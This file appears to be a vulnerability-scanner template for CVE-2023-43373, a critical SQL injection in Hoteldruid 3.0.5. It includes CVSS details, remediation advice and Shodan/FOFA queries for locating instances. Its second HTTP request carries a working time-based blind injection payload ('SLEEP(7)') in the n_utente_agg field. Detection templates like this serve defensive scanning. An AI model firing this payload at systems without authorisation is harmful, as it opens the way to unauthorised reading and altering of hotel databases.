id: CVE-2023-43373

info:
  name: Hoteldruid v3.0.5 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    Hoteldruid v3.0.5 was discovered to contain a SQL injection vulnerability via the n_utente_agg parameter at /hoteldruid/interconnessioni.php.
  impact: |
    Allows attackers to execute arbitrary SQL queries and potentially gain unauthorized access to the database.
  remediation: |
    Update Hoteldruid to a patched version or apply vendor-supplied fixes to mitigate the SQL Injection vulnerability.
  reference:
    - https://flashy-lemonade-192.notion.site/SQL-injection-in-hoteldruid-version-3-0-5-via-n_utente_agg-parameter-948a6d724b5348f3867ee6d780f98f1a
    - https://nvd.nist.gov/vuln/detail/CVE-2023-43373
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-43373
    cwe-id: CWE-89
    epss-score: 0.18494
    epss-percentile: 0.94933
    cpe: cpe:2.3:a:digitaldruid:hoteldruid:3.0.5:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: digitaldruid
    product: hoteldruid
    fofa-query: title="hoteldruid"
    shodan-query: title:"hoteldruid"
  tags: cve,cve2023,hoteldruid,sqli

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(tolower(body), "hoteldruid")'
        internal: true

  - raw:
      - |
        POST /interconnessioni.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw

        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="anno"

        2023
        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="id_sessione"


        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="modifica_interconnessione"

        SI
        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="modifica_utente_agg"

        SI
        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="n_utente_agg"

        1' AND (SELECT 3869 FROM (SELECT(SLEEP(7)))qSXB)-- QMbZ
        ------------YWJkMTQzNDcw--

    matchers:
      - type: dsl
        dsl:
          - 'duration>=7'
          - 'status_code == 200'
        condition: and
# digest: 490a00463044022050a05ea1776343bbb22c57a8480c343ba08644343bf72a3758a2d957de09ec1f022021f91bc3961ce980f81f6bd04d575ba662c0598401c3e57a72e6b9ff27c6a312:922c64590222798bb761d5b6d8e72950